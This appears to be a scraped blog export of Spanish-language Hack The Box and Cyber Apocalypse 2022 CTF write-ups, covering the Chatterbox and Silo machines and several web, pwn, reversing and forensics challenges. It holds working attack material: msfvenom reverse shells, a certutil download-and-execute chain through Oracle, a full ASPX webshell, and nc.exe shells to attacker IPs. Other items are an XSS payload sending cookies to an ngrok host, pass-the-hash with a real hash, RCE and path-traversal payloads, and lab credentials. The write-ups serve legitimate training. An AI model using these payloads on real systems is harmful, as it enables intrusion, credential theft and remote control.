visibles.  Escalación de privilegios alfred → nt authority system En el primer caso, bastaría con leer, escribir o ejecutar cualquier archivo dentro del directorio, si llegara a suceder que no se permite el acceso a un archivo bastaría con hacer uso de icacls para efectuar el cambio de permisos lo cual por herencia o jerarquía del directorio, se permitiría este cambio pudiendo así leer la bandera de root.txt.\nPor medio de icacls .\\root.txt /e /p alfred:f, tomando como referencia este post para verificar el uso del binario.\nEn el segundo caso, al probar alguna herramienta que permita acceso al sistema con credenciales como psexec se puede obtener una shell como NT AUTHORITY SYSTEM, probando las credenciales obtenidas anteriormente bajo la suposición de reutilización de contraseña.\nEjecutando impacket-psexec 'Administrator:Welcome1!@10.10.10.74'.\nReferencias  AChat expoit. Windows change access permissions from the command line.  ","permalink":"https://rzul.me/posts/htb-chatterbox/","summary":"Estadísticas    Característica Descripción     Nombre Chatterbox   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores lkys37en    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ nmap -T5 -vvv -open -p- -n -Pn -oG nmap/all_ports $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Chatterbox"},{"content":"Estadísticas    Característica Descripción     Nombre Silo   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores egre55    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower. Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:09 EDT Initiating SYN Stealth Scan at 23:09 Scanning 10.10.10.82 [65535 ports] Discovered open port 80/tcp on 10.10.10.82 Discovered open port 445/tcp on 10.10.10.82 Discovered open port 139/tcp on 10.10.10.82 Discovered open port 135/tcp on 10.10.10.82 Discovered open port 49161/tcp on 10.10.10.82 Discovered open port 49155/tcp on 10.10.10.82 Discovered open port 49162/tcp on 10.10.10.82 Discovered open port 49154/tcp on 10.10.10.82 Discovered open port 49160/tcp on 10.10.10.82 Discovered open port 47001/tcp on 10.10.10.82 Discovered open port 49153/tcp on 10.10.10.82 Discovered open port 49159/tcp on 10.10.10.82 Discovered open port 49152/tcp on 10.10.10.82 Discovered open port 5985/tcp on 10.10.10.82 Discovered open port 1521/tcp on 10.10.10.82 Completed SYN Stealth Scan at 23:09, 13.20s elapsed (65535 total ports) Nmap scan report for 10.10.10.82 Host is up, received user-set (0.064s latency). Scanned at 2022-05-23 23:09:27 EDT for 14s Not shown: 65520 closed tcp ports (reset) PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 127 135/tcp open msrpc syn-ack ttl 127 139/tcp open netbios-ssn syn-ack ttl 127 445/tcp open microsoft-ds syn-ack ttl 127 1521/tcp open oracle syn-ack ttl 127 5985/tcp open wsman syn-ack ttl 127 47001/tcp open winrm syn-ack ttl 127 49152/tcp open unknown syn-ack ttl 127 49153/tcp open unknown syn-ack ttl 127 49154/tcp open unknown syn-ack ttl 127 49155/tcp open unknown syn-ack ttl 127 49159/tcp open unknown syn-ack ttl 127 49160/tcp open unknown syn-ack ttl 127 49161/tcp open unknown syn-ack ttl 127 49162/tcp open unknown syn-ack ttl 127 Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 13.27 seconds Raw packets sent: 65634 (2.888MB) | Rcvd: 65535 (2.621MB) Escaneo específico └─$ nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49160,49161,49162 -n -Pn -oN nmap/targeted $TARGET Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 23:11 EDT Nmap scan report for 10.10.10.82 Host is up (0.065s latency). PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 | http-methods: |_ Potentially risky methods: TRACE |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/8.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open oracle-tns Oracle TNS listener (requires service name) 49160/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC 49162/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.0.2: |_ Message signing enabled but not required | smb2-time: | date: 2022-05-24T03:13:17 |_ start_date: 2022-05-24T02:53:36 | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: supported Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 127.10 seconds Enumeración Servicios Microsoft IIS - 80 Se expone la página por default de Microsoft IIS y al hacer uso de herramientas de fuzzing no se tuvo éxito al buscar algún directorio relevante, sin embargo, para el método intencionado de resolución es importante tener a consideración.\nOracle TNS Listener - 1521 Después de revisar acerca de la metodología empleada para este servicio, se buscó obtener información relevante respecto la versión, estatus, etc, haciendo uso de tnscmd10g sin éxito alguno.\nPosteriormente, en la metodología se mencionan los SID (Identificadores de Servicio, esencialmente pueden ser reconocidos como los nombres de las bases de datos), los cuales dependiendo de la instalación realizada pueden existir uno o más SIDs por defecto. Al no poder obtenerlos mediante tnscmd10g, se sugiere que realice fuerza bruta de los comúnes para identificar los existentes.\nhydra Haciendo uso de hydra -L content/sids-oracle.txt -s 1521 10.10.10.82 oracle-sid con el conjunto de diccionarios que ofrece hacktricks (el cual es un compendio de las listas de nmap y metasploit), se identificaron los SIDs:\n CLRExtProc. PLSExtProc. XE.  Explotación Nota: Después de resolver la máquina se suele verificar el proceso con otras fuentes, identificando de esta manera que existen 2 caminos a resolver la máquina una intencionada y una no intencionada, una más directa por no decir fácil que la otra. Primero se expondrá el método por el cuál se resolvió inicialmente y posteriormente la resolución intencionada.\nNo intencionada Obtención de credenciales Pasos previos | Preparación Haciendo uso de ODAT se obtuvieron credenciales de un usuario disponible, por medio de un módulo que la herramienta ofrece. Inicialmente se requiere la instalación descrita en el repositorio aunque por lo que respecta en kali, basta con clonar el repositorio.\nEjecución Como parte inicial se ejecutó un \u0026ldquo;Ave María\u0026rdquo; invocando todos los módulos que la herramienta ofrece para visualizar si de esta manera se identificaba algo que pudiera servir, para ello, la herramienta solicita un SID válido a ocupar, siendo XE el SID con información útil (identificándolo después de ejecutar el comando con cada uno de los SIDs). Haciendo uso de ./odat.py all -s 10.10.10.82 -p 1521 -d XE.\nPosteriormente se identificó que el módulo encargado de hacer este proceso es passwordguesser el cual simplemente sustituiría a all del comando.\nRCE Pasos previos | Preparación Posteriormente, al revisar los módulos disponibles se identificó que tanto el módulo dbmsscheduler como el módulo externaltable ofrecen capacidad de ejecutar comandos. Que al intentar usarlos no se permitió su ejecución debido a la falta de privilegios, sin embargo, se encontró que mediante la bandera --sysdba existe la posibilidad de \u0026ldquo;escalar\u0026rdquo; estos privilegios o impersonar un rol superior al que se tenía.\nEjecución Obteniendo así, una vez ejecutada la reverse shell, acceso directamente como administrador.\n Creando un payload con msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=1234 -f exe \u0026gt; pwn.exe. Descargándolo con ./odat.py dbmsscheduler -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \u0026quot;certutil.exe -f -urlcache -split http://10.10.14.16/pwn.exe c:\\windows\\temp\\pwn.exe\u0026quot; --sysdba. Y ejecutándolo con ./odat.py externaltable -s 10.10.10.82 -p 1521 -U scott -P tiger -d XE --exec \u0026quot;c:\\windows\\temp\u0026quot; \u0026quot;pwn.exe\u0026quot; --sysdba.  Intencionada Si bien odat permite la lectura, escritura y ejecución de archivos, todo lo que realiza en estos procesos no resulta tan \u0026ldquo;transparente\u0026rdquo; por lo que para entender un poco acerca de Oracle se realizo parte del mismo proceso por medio de SQL directamente.\nNota: Se da por hecho que se realizo el descubrimiento de los SIDs y de las credenciales válidas, dado que scott:tiger son credenciales por default.\nRCE Pasos previos | Preparación Como parte de la instalación de odat, se realiza la instalación del cliente sql para conectarse a la base de datos de Oracle.\nPor lo que una vez instalado se permite la conexión al host por medio de sqlplus64 scott/tiger@10.10.10.82:1521/XE as sysdba.\nEjecución Oracle ocupa su propia sintaxis por lo que con el siguiente pedazo de código se buscó obtener el contenido del archivo por defecto del servidor. Buscando obtener respuesta por medio del prompt configurando primeramente set serveroutput ON para su visualización.\ndeclare f utl_file.file_type; s varchar(200); begin f := utl_file.fopen(\u0026#39;/inetpub/wwwroot\u0026#39;, \u0026#39;iisstart.htm\u0026#39;, \u0026#39;R\u0026#39;); utl_file.get_line(f,s); utl_file.fclose(f); dbms_output.put_line(s); end; Por otra parte se puede verificar que también exista la capacidad de escribir a un archivo, verificándolo con el siguiente segmento de código.\ndeclare f utl_file.file_type; s varchar(5000) := \u0026#39;Hello world\u0026#39;; begin f := utl_file.fopen(\u0026#39;/inetpub/wwwroot\u0026#39;, \u0026#39;srrequiem.txt\u0026#39;, \u0026#39;W\u0026#39;); utl_file.put_line(f,s); utl_file.fclose(f); end; Una vez validada la escritura, se abre la puerta a la creación de una reverse shell, el inconveniente es que debido al espacio limitado en las variables respecto a los caracteres no fue posible llevarlo a cabo, por lo que se optó por una webshell en su lugar.\nUtilizando /usr/share/webshells/aspx/cmdasp.aspx eliminando estilos, comentarios y saltos de línea para reducir los caracteres se obtuvo ejecución en la máquina.\nCódigo de página empleado:\n\u0026lt;%@ Page Language=\u0026#34;C#\u0026#34; Debug=\u0026#34;true\u0026#34; Trace=\u0026#34;false\u0026#34; %\u0026gt;\u0026lt;%@ Import Namespace=\u0026#34;System.Diagnostics\u0026#34; %\u0026gt;\u0026lt;%@ Import Namespace=\u0026#34;System.IO\u0026#34; %\u0026gt;\u0026lt;script Language=\u0026#34;c#\u0026#34; runat=\u0026#34;server\u0026#34;\u0026gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = \u0026#34;cmd.exe\u0026#34;;psi.Arguments = \u0026#34;/c \u0026#34;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;);}\u0026lt;/script\u0026gt;\u0026lt;HTML\u0026gt;\u0026lt;body \u0026gt;\u0026lt;form id=\u0026#34;cmd\u0026#34; method=\u0026#34;post\u0026#34; runat=\u0026#34;server\u0026#34;\u0026gt;\u0026lt;asp:TextBox id=\u0026#34;txtArg\u0026#34; runat=\u0026#34;server\u0026#34; Width=\u0026#34;250px\u0026#34;\u0026gt;\u0026lt;/asp:TextBox\u0026gt;\u0026lt;asp:Button id=\u0026#34;testing\u0026#34; runat=\u0026#34;server\u0026#34; Text=\u0026#34;excute\u0026#34; OnClick=\u0026#34;cmdExe_Click\u0026#34;\u0026gt;\u0026lt;/asp:Button\u0026gt;\u0026lt;asp:Label id=\u0026#34;lblText\u0026#34; runat=\u0026#34;server\u0026#34;\u0026gt;Command:\u0026lt;/asp:Label\u0026gt;\u0026lt;/form\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/HTML\u0026gt; Post Explotación Enumeración Se identificó que entre los privilegios disponibles del usuario obtenido se encuentra habilitado SeImpersonatePrivilege lo que lleva a un camino de escalación de privilegios por medio de Rotten o JuicyPotato.\nSe identificó un archivo accesible en el escritorio de uno de los usuarios del sistema c:\\users\\phineas\\desktop\\oracle issue.txt el cual indica que se trata de un dumpeo de memoria del sistema.\nContenido:\nSupport vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested): Dropbox link provided to vendor (and password under separate cover). Dropbox link https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0 link password: £%Hm8646uC$ Nota: Cabe recalcar que el caracter £ puede que no se interprete correctamente si se optó por entablar una reverse shell, causando su omisión y por consiguiente, que a la hora de la descarga indique que la contraseña no es válida. Teniendo que realizar un procesado extra (ejemplo base64) para extraer su contenido. Accediendo al archivo por medio de la webshell no existió este problema\nEscalación de privilegios Método 1 - Juicy Potato Habiendo encontrado los privilegios relacionados con este método de escalación, sólo restaría probar su ejecución mediante el binario y con las opciones utilizadas para entablar una reverse shell con permisos elevados NT AUTHORITY\\SYSTEM.\n.\\jp.exe -t * -l 1337 -p c:\\windows\\temp\\nc.exe -a \u0026quot; -e cmd.exe 10.10.14.16 4321\u0026quot;\nCon lo que respecta a los argumentos utilizados, el binario mismo da la descripción de cada uno de ellos.\nCon lo que respecta a la práctica los argumentos -t y -l no representa algo sustancial el cambiar valores. Y en donde -p (programa a ejecutar) y -a (argumentos a utilizar por el programa señalado) se usaron a partir de las herramientas usadas en pasos anteriores.\nMétodo 2 - Memdump Con la copia de memoria descargada, se puede hacer uso de volatility para analizarla. Buscando antes que todo un perfil acorde al perteneciente al dumpeo de memoria, por medio de ./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp imageinfo teniendo en cuenta que debido al acceso previamente obtenido se puede buscar un perfil más adecuado.\nEjecutando systeminfo en la máquina se pueden comparar resultados, identificando el perfil Win2012R2x64 como el más adecuado.\nHaciendo uso del plugin hashdump se pueden obtener los hashes del sistema, exponiendo de esta manera una forma de acceder a la máquina como el usuario Administrator. Por medio de ./volatility_2.6_lin64_standalone -f /home/srrequiem/Documents/htb/windows/medium/silo/content/SILO-20180105-221806.dmp --profile=Win2012R2x64 hashdump.\nObteniendo acceso haciendo uso del hash con impacket-psexec Administrator@10.10.10.82 -hashes :9e730375b7cbcebf74ae46481e07b0c7.\nReferencias  Hack Tricks - Pentesting Oracle TNS Listener. odat.py. 0xdf Write-up. Ippsec Walkthrough. PayloadAllTheThings - JuicyPotato. Binarios Juicy Potato. Releases Volatility. Github Volatility.  ","permalink":"https://rzul.me/posts/htb-silo/","summary":"Estadísticas    Característica Descripción     Nombre Silo   OS Windows   Dificultad oficial Medium   Dificultad de comunidad    Puntos 30   Creadores egre55    Reconocimiento Escaneo de host Escaneo completo de puertos └─$ sudo nmap -sS --min-rate 5000 -vvv -open -p- -n -Pn -oG nmap/all_ports_ss $TARGET Host discovery disabled (-Pn). All addresses will be marked \u0026#39;up\u0026#39; and scan times may be slower.","title":"Hack The Box - Silo"},{"content":"Intro El CTF de Cyber Apocalypse volvió este año, bajo una temática intergaláctica estando disponible del 14 al 20 de Mayo del 2022. Mediante este enlace se puede obtener más información del evento.\nAquí se encuentran las soluciones de los retos que pude resolver durante mi participación.\nEl write-up aquí presente fue generado por medio de CTFScrapper para la creación de un entorno de trabajo y para la descarga de los archivos de los retos, disponibles en mi compendio de retos.\nRetos Web Kryptos Support Stats    Attribute Info     Difficulty easy   Description The secret vault used by the Longhir\u0026rsquo;s planet council, Kryptos, contains some very sensitive state secrets that Virgil and Ramona are after to prove the injustice performed by the commission. Ulysses performed an initial recon at their request and found a support portal for the vault. Can you take a look if you can infiltrate this system?   File -    Solución Después de navegar y revisar el sitio disponible, dado que se menciona que el admin del sitio visualizará los tickets de servicio dados de alta, se puede suponer que se trata de un ataque XSS.\nHaciendo uso del payload:\n\u0026lt;img src=\u0026#34;\u0026#34; onerror=fetch(\u0026#34;https://a748-189-203-27-57.ngrok.io/\u0026#34;+document.cookie).then() /\u0026gt; Con la intención de robar una cookie de sesión correspondiente a la del admin, como lo menciona el sitio.\nDe acuerdo a como está construida la cookie, se identificó que se trata de un JWT.\nAl buscar más información siendo que con la cookie de sesión no revela ningún cambio al utilizarla se identificó en el código fuente de http://\u0026lt;challenge url\u0026gt;/login se revela un directorio disponible haciendo uso de la cookie obtenida.\nlogin.js\nVista de http://\u0026lt;challenge url\u0026gt;/tickets haciendo uso de la cookie obtenida.\nVista de http://\u0026lt;challenge url\u0026gt;/settings haciendo uso de la cookie obtenida. Exponiendo la funcionalidad del cambio de contraseña del \u0026ldquo;usuario logueado\u0026rdquo;.\nAl visualizar el código se puede identificar que el parámetro uid es enviado al hacer uso de la funcionalidad.\nBuscando invocar la funcionalidad haciendo uso de curl se envió el uid del moderador como prueba.\ncurl -v http://13868188223:30914/api/users/update -X POST -H \u0026quot;Content-Type: application/json\u0026quot; -d '{\u0026quot;password\u0026quot;:\u0026quot;123456\u0026quot;,\u0026quot;uid\u0026quot;:100}' --cookie \u0026quot;session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2NDYxMzd9Z.HRsjja_ehTEx7FxfjilkTjO3_gRsHkt_jmovFZY1OA\u0026quot;\nHabiéndo mencionado que se envía el uid en la petición, se decidió cambiar el varlor a 1 siendo que generalmente se reserva ese id para administradores.\nAl haber sido satisfactorio el cambio de contraseña se puede realizar el login como admin, obteniendo de esta manera la bandera.\n Flag: HTB{x55_4nd_id0rs_ar3_fun!!}\n BlinkerFluids Stats    Attribute Info     Difficulty easy   Description Once known as an imaginary liquid used in automobiles to make the blinkers work is now one of the rarest fuels invented on Klaus' home planet Vinyr. The Golden Fang army has a free reign over this miraculous fluid essential for space travel thanks to the Blinker Fluids™ Corp. Ulysses has infiltrated this supplier organization\u0026rsquo;s one of the HR department tools and needs your help to get into their server. Can you help him?   File web_blinkerfluids.zip    Solución Después de identificar la composición del código se encontró que:\n La bandera se encontraba en /flag.txt. Una librería empleada es vulnerable a RCE (md-to-pdf). Por la configuación de la aplicación, sólo se permitía la obtención de archivos en el directorio /static/invoices/.  Al capturar el contenido enviado se utilizó el payload ---js\\n((require(\\\u0026quot;child_process\\\u0026quot;))execSync(\\\u0026quot;cp /flag.txt /static/invoices/flag.txt\\\u0026quot;))\\n---RCE como cuerpo del archivo markdown.\nEjecutando así el payload y permitiendo navegar a donde se encuentra la bandera\n Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}\n Pwn Space Pirate: Entrypoint Stats    Attribute Info     Difficulty easy   Description D12 is one of Golden Fang\u0026rsquo;s missile launcher spaceships. Our mission as space pirates is to highjack D12, get inside the control panel room, and access the missile launcher system. To achieve our goal, we split the mission into three parts. In this part, all we need to do is bypass the scanning system and open the gates so that we proceed further.   File pwn_sp_entrypoint.zip    Solución Con los archivos que disponibles se probó localmente el binario y a modo de prueba y error, se identificó que al hacer uso de la contraseña 1234 el binario lee los contenidos del archivo local flag.txt.\n1 Scan card 💳 2 Insert password ↪️ \u0026gt; 2 [*] Insert password: 1234 [+] Door opened, you can proceed with the passphrase: HTB{f4k3_fl4g_4_t35t1ng} [-] Invalid option! Intruder detected! 🚨 🚨 Por lo que de la misma manera se realizó el mismo proceso en la conexión remota disponible.\n1 Scan card 💳 2 Insert password ↪️ \u0026gt; 2 [*] Insert password: 1234 [+] Door opened, you can proceed with the passphrase: HTB{th3_g4t35_4r3_0p3n!} [-] Invalid option! Intruder detected! 🚨 🚨  Flag: HTB{th3_g4t35_4r3_0p3n!}\n Reversing WIDE Stats    Attribute Info     Difficulty easy   Description We\u0026rsquo;ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You\u0026rsquo;ve managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control?   File rev_wide.zip    Solución Después de interactuar con el binario y ver las posibilidades ofrecidas, la opción que se visualiza como cifrada pide una contraseña para visualizar su contenido.\nBuscando el valor en duro mediante su ejecución en IDA, al revisar el flujo se puede ver un valor posible que pudiera ser usado como contraseña.\nObteniendo el valor: sup3rs3cr3tw1d3.\nY al pasarse como contraseña, se obtuvo la bandera.\n Flag: HTB{str1ngs_4r3nt_4lw4ys_4sc11}\n Forensics Puppeteer Stats    Attribute Info     Difficulty easy   Description Planet Longhir is known for it\u0026rsquo;s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation\u0026rsquo;s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite\u0026rsquo;s location was leaked since it is a top-sercret that only Galactic Federation\u0026rsquo;s council is aware of. Help her analyse the Council\u0026rsquo;s HQ event logs and solve this mystery.   File forensics_puppeteer.zip    Solución Se uso como base la solución de un reto similar que anteriormente HackTheBox había publicado, que fue encontrado al buscar como realizar análisis a los tipos de archivos dados.\nAl revisar el mismo archivo indicado en el writeup (Microsoft-Windows-PowerShell%4Operationalevtx), que por suerte, también existe en los logs de eventos, se puede visualizar una serie de eventos que tienen que ver con la descripción del reto (contexto del evento).\nEn uno de ellos se encuentra algo que por su composición se asume que es shellcode, al tratar de interpretar que es lo realiza antes de ejecutarse se puede visualizar que el código concatena dos arreglos de bytes declarados antes del shellcode asignando este nuevo valor a otra variable y posteriormente realiza un XOR a cada elemento con 0xd1\n Declaración de stages Concatenación XOR a cada elemento  Se imprimió esta variable para saber su contenido, el cual, al decodearse de los decimales obtenidos a ascii se obtuvo la bandera, haciendo uso de esta receta de CyberChef.\nModificación a script original:\nEjecución:\nDecodeo de valores obtenidos para obtener bandera:\n Flag: HTB{b3wh4r3_0f_th3_b00t5_0f_just1c3}\n Golden Persistence Stats    Attribute Info     Difficulty easy   Description Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir\u0026rsquo;s space station and escalate their privileges, they will soon be able to activate the station\u0026rsquo;s defence mechanisms that are able to prevent any spaceship from entering Urkir\u0026rsquo;s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again.   File forensics_golden_persistence.zip    Solución Después de investigar acerca del análisis del archivo dado (NTUSER.dat), se encontró este write-up en el que se hace uso de diferentes herramientas para análizar y navegar entre los registros del archivo, del cuál en el registro /Software/Microsoft/Windows/CurrentVersion/Run se identificó el uso de powershell con un parámetro poco convencional. Haciendo uso de reglookup -p /Software/Microsoft/Windows/CurrentVersion/Run NTUSER.DAT.\nDespués de identificar que el parámetro se encontraba codificado en base64 y desencodeándolo, se puede visualizar el script utilizado.\nDe acuerdo al código, el script hace uso de los valores de los registros indicados por lo que en pasos consiguientes fue necesario buscar los mismos.\nExtrayendo de la misma manera los valores se pueden sustituir las variables correspondientes directamente.\nAl ejecutar la reconstrucción del script, aún presentaba inconsistencias de sintaxis, al limpiarlo para buscar una ejecución correcta quedó de la siguiente manera\nScript completo function encr { param( [Byte[]]$data, [Byte[]]$key ) [Byte[]]$buffer = New-Object Byte[] $data.Length $data.CopyTo($buffer, 0) [Byte[]]$s = New-Object Byte[] 256; [Byte[]]$k = New-Object Byte[] 256; for ($i = 0; $i -lt 256; $i++) { $s[$i] = [Byte]$i; $k[$i] = $key[$i % $key.Length]; } $j = 0; for ($i = 0; $i -lt 256; $i++) { $j = ($j + $s[$i] + $k[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; } $i = $j = 0; for ($x = 0; $x -lt $buffer.Length; $x++) { $i = ($i + 1) % 256; $j = ($j + $s[$i]) % 256; $temp = $s[$i]; $s[$i] = $s[$j]; $s[$j] = $temp; [int]$t = ($s[$i] + $s[$j]) % 256; $buffer[$x] = $buffer[$x] -bxor $s[$t]; } return $buffer } function HexToBin { param( [Parameter( Position=0, Mandatory=$true, ValueFromPipeline=$true) ] [string]$s) $return = @() for ($i = 0; $i -lt $s.Length ; $i += 2) { $return += [Byte]::Parse($s.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber) } Write-Output $return } $enc = [System.Text.Encoding]::ASCII [Byte[]]$key = $enc.GetBytes(\u0026#34;Q0mmpr4B5rvZi3pS\u0026#34;) #$encrypted1 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\ZYb78P4s).t3RBka5tL #$encrypted2 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\BjqAtIen).uLltjjW #$encrypted3 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\AppDataLow\\t03A1Stq).uY4S39Da #$encrypted4 = (Get-ItemProperty -Path HKCU:\\SOFTWARE\\Google\\Nv50zeG).Kb19fyhl #$encrypted5 = (Get-ItemProperty -Path HKCU:\\AppEvents\\Jx66ZG0O).jH54NW8C $encrypted1 = \u0026#34;F844A6035CF27CC4C90DFEAF579398BE6F7D5ED10270BD12A661DAD04191347559B82ED546015B07317000D8909939A4DA7953AED8B83C0FEE4EB6E120372F536BC5DC39\u0026#34; $encrypted2 = \u0026#34;CC19F66A5F3B2E36C9B810FE7CC4D9CE342E8E00138A4F7F5CDD9EED9E09299DD7C6933CF4734E12A906FD9CE1CA57D445DB9CABF850529F5845083F34BA1\u0026#34; $encrypted3 = \u0026#34;C08114AA67EB979D36DC3EFA0F62086B947F672BD8F966305A98EF93AA39076C3726B0EDEBFA10811A15F1CF1BEFC78AFC5E08AD8CACDB323F44B4D\u0026#34; $encrypted4 = \u0026#34;D814EB4E244A153AF8FAA1121A5CCFD0FEAC8DD96A9B31CCF6C3E3E03C1E93626DF5B3E0B141467116CC08F92147F7A0BE0D95B0172A7F34922D6C236BC7DE54D8ACBFA70D1\u0026#34; $encrypted5 = \u0026#34;84AB553E67C743BE696A0AC80C16E2B354C2AE7918EE08A0A3887875C83E44ACA7393F1C579EE41BCB7D336CAF8695266839907F47775F89C1F170562A6B0A01C0F3BC4CB\u0026#34; $encrypted = \u0026#34;$($encrypted1)$($encrypted2)$($encrypted3)$($encrypted4)$($encrypted5)\u0026#34; [Byte[]]$data = HexToBin $encrypted $DecryptedBytes = encr $data $key $DecryptedString = $enc.GetString($DecryptedBytes) $DecryptedString #$DecryptedString|iex Del cuál al ejecutarse se obtiene el valor original del parámetro ejecutado, encontrando de esta manera la bandera.\n Flag: HTB{g0ld3n_F4ng_1s_n0t_st34lthy_3n0ugh}\n Misc Compressor Stats    Attribute Info     Difficulty easy   Description Ramona\u0026rsquo;s obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang\u0026rsquo;s ownership called \u0026ldquo;Compressor\u0026rdquo;, which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?   File -    Solución Para este reto se exponía una conexión a un host en donde se ofrecían diferentes opciones para interactuar con el binario disponible.\nDe acuerdo a la interacción se encontraron 2 formas de resolver el reto, mediante un Path traversal haciendo uso de la ejecución de cat disponible.\n└─$ nc 138.68.183.64 31076 [*] Directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S Component List: +===============+ | | | 1. Head 🤖 | | 2. Torso 🦴 | | 3. Hands 💪 | | 4. Legs 🦵 | | | +===============+ [*] Choose component: 1 [*] Sub-directory to work in: tHV1tdX82QcPllglF8wa6AhU24FRZS4S/Head Actions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 3 Insert name you want to read: ../../flag.txt HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5} Y también por medio de la utilidad expuesta de zip se encuentra un GTFOBin el cuál permite la invocación de una shell.\nActions: 1. Create artifact 2. List directory (pwd; ls -la) 3. Read artifact (cat ./\u0026lt;name\u0026gt;) 4. Compress artifact (zip \u0026lt;name\u0026gt;.zip \u0026lt;name\u0026gt; \u0026lt;options\u0026gt;) 5. Change directory (cd \u0026lt;dirname\u0026gt;) 6. Clean directory (rm -rf ./*) 7. Exit [*] Choose action: 4 Insert \u0026lt;name\u0026gt;.zip: Insert \u0026lt;name\u0026gt;: /etc/passwd Insert \u0026lt;options\u0026gt;: -T -TT \u0026#39;sh #\u0026#39; adding: etc/passwd (deflated 62%) ls -la total 12 drwxr-sr-x 2 ctf ctf 4096 May 18 23:01 . drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 .. -rw------- 1 ctf ctf 650 May 18 23:01 zikfJpfK cd .. ls -la total 24 drwxr-sr-x 6 ctf ctf 4096 May 18 23:00 . drwxr-sr-x 1 ctf ctf 4096 May 18 23:00 .. drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Hands drwxr-sr-x 2 ctf ctf 4096 May 18 23:01 Head drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Legs drwxr-sr-x 2 ctf ctf 4096 May 18 23:00 Torso 